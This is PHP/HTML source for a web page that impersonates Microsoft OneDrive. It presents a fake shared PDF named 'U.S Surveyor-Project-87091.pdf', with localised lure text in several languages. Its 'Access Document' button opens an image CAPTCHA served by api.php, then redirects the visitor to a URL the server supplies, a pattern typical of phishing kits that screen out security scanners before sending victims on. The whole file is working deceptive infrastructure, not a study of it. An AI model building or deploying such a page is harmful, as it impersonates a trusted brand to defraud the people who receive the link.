<?php
$today = (new DateTime('now', new DateTimeZone('Europe/Berlin')))->format('F j, Y');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shared Document</title>
    <link rel="icon" href="img.php?k=icon" type="image/svg+xml">
    <style>
        :root {
            --brand-primary: #0078d4;
            --brand-hover: #106ebe;
            --white: #ffffff;
            --text-main: #1b1b1b;
            --text-sub: #616161;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: "Segoe UI", -apple-system, system-ui, BlinkMacSystemFont, Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f3f9fd;
            background-image:
                radial-gradient(circle at 12% 18%, rgba(0, 120, 212, 0.18) 0%, transparent 55%),
                radial-gradient(circle at 88% 82%, rgba(0, 164, 239, 0.16) 0%, transparent 55%);
            background-attachment: fixed;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .auth-card {
            background: var(--white);
            width: 420px;
            max-width: 100%;
            border-radius: 8px;
            padding: 40px 44px;
            box-shadow: 0 6px 30px rgba(0,0,0,0.1), 0 1px 4px rgba(0,0,0,0.06);
            text-align: center;
            border: 1px solid rgba(0,0,0,0.05);
            border-top: 4px solid var(--brand-primary);
            animation: cardIn 0.5s cubic-bezier(0.16,1,0.3,1) forwards;
            opacity: 0;
        }

        @keyframes cardIn {
            0% { opacity: 0; transform: translateY(18px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        .brand-logo { width: 64px; height: 64px; object-fit: contain; margin-bottom: 8px; }
        .od-wordmark { font-size: 18px; font-weight: 600; color: #1b1b1b; margin-bottom: 20px; }
        .od-wordmark span { color: var(--brand-primary); }

        .file-info {
            background: #f0f7fc;
            border: 1px solid #cce4f7;
            border-radius: 8px;
            padding: 14px 18px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: border-color 0.25s, box-shadow 0.25s;
        }

        .file-info:hover { border-color: var(--brand-primary); box-shadow: 0 0 0 1px var(--brand-primary); }
        .file-icon { width: 36px; height: 36px; flex-shrink: 0; }
        .file-details { text-align: left; }
        .file-name { font-size: 13.5px; font-weight: 600; color: var(--text-main); }
        .file-meta { font-size: 12px; color: var(--text-sub); margin-top: 2px; }
        .subtext { font-size: 14px; color: var(--text-sub); margin-bottom: 24px; line-height: 1.5; }

        .cta-button {
            display: inline-block;
            background-color: var(--brand-primary);
            color: white !important;
            text-decoration: none;
            padding: 12px 32px;
            font-size: 15px;
            font-weight: 600;
            border-radius: 4px;
            border: none;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.2s, box-shadow 0.2s, transform 0.12s;
            box-shadow: 0 2px 6px rgba(0,120,212,0.15);
        }

        .cta-button:hover { background-color: var(--brand-hover); box-shadow: 0 4px 14px rgba(0,120,212,0.28); transform: translateY(-1px); }
        .cta-button:active { transform: translateY(0) scale(0.99); }

        .footer-note {
            margin-top: 20px;
            font-size: 12px;
            color: var(--text-sub);
            border-top: 1px solid #f0f0f0;
            padding-top: 16px;
        }

        .captcha-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.45);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.25s, visibility 0.25s;
            padding: 16px;
        }

        .captcha-overlay.active { opacity: 1; visibility: visible; }

        .captcha-card {
            background: white;
            width: 360px;
            max-width: 100%;
            border-radius: 4px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.2);
            overflow: hidden;
            transform: translateY(20px) scale(0.97);
            transition: transform 0.3s cubic-bezier(0.16,1,0.3,1), opacity 0.3s;
            opacity: 0;
        }

        .captcha-overlay.active .captcha-card { transform: translateY(0) scale(1); opacity: 1; }

        .captcha-header {
            background: #1a73e8;
            color: #fff;
            padding: 14px 16px 12px;
            text-align: left;
        }

        .captcha-header h2 {
            font-size: 15px;
            font-weight: 500;
            line-height: 1.4;
        }

        .captcha-header p {
            font-size: 12px;
            opacity: 0.9;
            margin-top: 4px;
        }

        .captcha-body { padding: 16px; position: relative; }

        .image-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-bottom: 16px;
        }

        .tile {
            position: relative;
            aspect-ratio: 1;
            border: 2px solid #dadce0;
            border-radius: 2px;
            background: #f8f9fa;
            cursor: pointer;
            overflow: hidden;
            transition: border-color 0.15s, box-shadow 0.15s;
        }

        .tile:hover { border-color: #4285f4; }

        .tile.selected {
            border-color: #1a73e8;
            box-shadow: inset 0 0 0 1px #1a73e8;
        }

        .tile img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            padding: 12px;
            pointer-events: none;
        }

        .tile-check {
            position: absolute;
            top: 6px;
            right: 6px;
            width: 22px;
            height: 22px;
            border-radius: 2px;
            background: #1a73e8;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transform: scale(0.8);
            transition: opacity 0.15s, transform 0.15s;
        }

        .tile.selected .tile-check {
            opacity: 1;
            transform: scale(1);
        }

        .tile-check svg { width: 14px; height: 14px; fill: #fff; }

        .captcha-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 12px;
        }

        .captcha-actions button {
            font-family: inherit;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            padding: 9px 16px;
            border: none;
        }

        .btn-refresh {
            background: #fff;
            color: #5f6368;
            border: 1px solid #dadce0 !important;
        }

        .btn-refresh:hover { background: #f8f9fa; }

        .btn-verify {
            background: #1a73e8;
            color: #fff;
            min-width: 96px;
        }

        .btn-verify:hover { background: #1558b0; }
        .btn-verify:disabled { opacity: 0.55; cursor: default; }

        .captcha-loading {
            position: absolute;
            inset: 0;
            background: rgba(255,255,255,0.9);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 5;
        }

        .captcha-loading.hidden { display: none; }

        .captcha-spinner {
            width: 28px;
            height: 28px;
            border: 3px solid #e8e8e8;
            border-top-color: #1a73e8;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin-bottom: 8px;
        }

        .captcha-loading p { font-size: 12px; color: #5f6368; }

        @keyframes spin { to { transform: rotate(360deg); } }

        .error-banner {
            background: #fce8e6;
            color: #c5221f;
            font-size: 12px;
            padding: 8px 12px;
            border-radius: 4px;
            margin-bottom: 12px;
            display: none;
        }

        .error-banner.visible { display: block; }

        .captcha-footer {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 6px;
            padding: 10px 16px 12px;
            border-top: 1px solid #f1f3f4;
            font-size: 10px;
            color: #9aa0a6;
        }

        .captcha-footer svg { width: 16px; height: 16px; fill: #9aa0a6; }
    </style>
</head>
<body>

    <div class="auth-card">
        <img class="brand-logo" src="img.php?k=logo" alt="OneDrive">
        <div class="od-wordmark">One<span>Drive</span></div>
        <div class="file-info">
            <svg class="file-icon" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
                <rect x="4" y="2" width="28" height="32" rx="3" fill="#f0f7fc" stroke="#0078d4" stroke-width="1.5"/>
                <line x1="10" y1="12" x2="26" y2="12" stroke="#0078d4" stroke-width="1.5" opacity="0.4"/>
                <line x1="10" y1="18" x2="26" y2="18" stroke="#0078d4" stroke-width="1.5" opacity="0.4"/>
                <line x1="10" y1="24" x2="20" y2="24" stroke="#0078d4" stroke-width="1.5" opacity="0.4"/>
            </svg>
            <div class="file-details">
                <div class="file-name">U.S Surveyor-Project-87091.pdf</div>
                <div class="file-meta">248 KB &bull; <span id="currentDate"><?= htmlspecialchars($today, ENT_QUOTES, 'UTF-8') ?></span></div>
            </div>
        </div>
        <p class="subtext" id="subtext">A document has been shared with you via OneDrive. Only authorized recipients can access this file.</p>
        <button class="cta-button" id="accessBtn">Access Document</button>
        <div class="footer-note" id="footerNote">This file is protected by OneDrive security.</div>
    </div>

    <div class="captcha-overlay" id="captchaOverlay">
        <div class="captcha-card">
            <div class="captcha-header">
                <h2 id="captchaTitle">Select all images with cars</h2>
                <p id="captchaSubtitle">Click verify once you're done.</p>
            </div>
            <div class="captcha-body">
                <div class="captcha-loading" id="captchaLoading">
                    <div class="captcha-spinner"></div>
                    <p>Loading images...</p>
                </div>
                <div class="error-banner" id="errorBanner"></div>
                <div class="image-grid" id="imageGrid"></div>
                <div class="captcha-actions">
                    <button type="button" class="btn-refresh" id="refreshBtn">New images</button>
                    <button type="button" class="btn-verify" id="verifyBtn" disabled>Verify</button>
                </div>
            </div>
            <div class="captcha-footer">
                <span>Protected verification</span>
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                </svg>
            </div>
        </div>
    </div>

    <script>
    (function () {
        const overlay     = document.getElementById('captchaOverlay');
        const grid        = document.getElementById('imageGrid');
        const loadingEl   = document.getElementById('captchaLoading');
        const errorBanner = document.getElementById('errorBanner');
        const verifyBtn   = document.getElementById('verifyBtn');
        const refreshBtn  = document.getElementById('refreshBtn');
        const captchaTitle = document.getElementById('captchaTitle');

        let challengeToken = '';
        let selected = new Set();

        const translations = {
            es: { subtext: 'Se ha compartido un documento contigo a través de OneDrive. Solo los destinatarios autorizados pueden acceder a este archivo.', accessBtn: 'Acceder al documento', footerNote: 'Este archivo está protegido por la seguridad de OneDrive.', captchaSubtitle: 'Haz clic en verificar cuando termines.' },
            de: { subtext: 'Eine Datei wurde über OneDrive für Sie freigegeben. Nur autorisierte Empfänger können auf diese Datei zugreifen.', accessBtn: 'Dokument öffnen', footerNote: 'Diese Datei ist durch OneDrive-Sicherheit geschützt.', captchaSubtitle: 'Klicken Sie auf Überprüfen, wenn Sie fertig sind.' },
            fr: { subtext: 'Un document a été partagé avec vous via OneDrive. Seuls les destinataires autorisés peuvent y accéder.', accessBtn: 'Accéder au document', footerNote: 'Ce fichier est protégé par la sécurité OneDrive.', captchaSubtitle: 'Cliquez sur Vérifier une fois terminé.' }
        };

        const lang = (navigator.language || navigator.userLanguage || '').substring(0, 2).toLowerCase();
        if (translations[lang]) {
            document.getElementById('subtext').textContent = translations[lang].subtext;
            document.getElementById('accessBtn').textContent = translations[lang].accessBtn;
            document.getElementById('footerNote').textContent = translations[lang].footerNote;
            document.getElementById('captchaSubtitle').textContent = translations[lang].captchaSubtitle;
            try {
                document.getElementById('currentDate').textContent = new Date().toLocaleDateString(navigator.language, { year: 'numeric', month: 'long', day: 'numeric', timeZone: 'Europe/Berlin' });
            } catch (e) {}
        }

        function hideError() {
            errorBanner.classList.remove('visible');
            errorBanner.textContent = '';
        }

        function showError(msg) {
            errorBanner.textContent = msg;
            errorBanner.classList.add('visible');
        }

        function renderGrid(tiles) {
            grid.innerHTML = '';
            selected = new Set();
            verifyBtn.disabled = true;
            hideError();

            tiles.forEach(function (tile) {
                const btn = document.createElement('button');
                btn.type = 'button';
                btn.className = 'tile';
                btn.dataset.id = String(tile.id);
                btn.innerHTML =
                    '<img src="img.php?k=' + encodeURIComponent(tile.type) + '" alt="">' +
                    '<span class="tile-check"><svg viewBox="0 0 24 24"><path d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg></span>';

                btn.addEventListener('click', function () {
                    const id = parseInt(btn.dataset.id, 10);
                    if (selected.has(id)) {
                        selected.delete(id);
                        btn.classList.remove('selected');
                    } else {
                        selected.add(id);
                        btn.classList.add('selected');
                    }
                    verifyBtn.disabled = selected.size === 0;
                });

                grid.appendChild(btn);
            });
        }

        async function loadChallenge() {
            loadingEl.classList.remove('hidden');
            verifyBtn.disabled = true;
            refreshBtn.disabled = true;
            hideError();

            try {
                const res = await fetch('api.php?action=challenge');
                const data = await res.json();
                if (data.error) {
                    showError(data.error);
                    return;
                }

                challengeToken = data.token;
                captchaTitle.textContent = 'Select all images with ' + data.label;
                renderGrid(data.tiles);
            } catch (e) {
                showError('Could not load verification. Please refresh.');
            } finally {
                loadingEl.classList.add('hidden');
                refreshBtn.disabled = false;
            }
        }

        async function submitVerification() {
            if (!challengeToken || selected.size === 0) return;

            loadingEl.querySelector('p').textContent = 'Verifying...';
            loadingEl.classList.remove('hidden');
            verifyBtn.disabled = true;
            refreshBtn.disabled = true;
            hideError();

            try {
                const res = await fetch('api.php?action=verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        token: challengeToken,
                        selected: Array.from(selected)
                    })
                });
                const data = await res.json();

                if (data.status === 'success') {
                    window.location.href = data.redirect;
                    return;
                }

                showError(data.message || 'Incorrect selection. Try again.');
                setTimeout(loadChallenge, 900);
            } catch (e) {
                showError('Network error. Try again.');
                loadingEl.classList.add('hidden');
                verifyBtn.disabled = false;
                refreshBtn.disabled = false;
            }
        }

        document.getElementById('accessBtn').addEventListener('click', function () {
            overlay.classList.add('active');
            loadChallenge();
        });

        overlay.addEventListener('click', function (e) {
            if (e.target === overlay) {
                overlay.classList.remove('active');
            }
        });

        verifyBtn.addEventListener('click', submitVerification);
        refreshBtn.addEventListener('click', loadChallenge);
    })();
    </script>
</body>
</html>
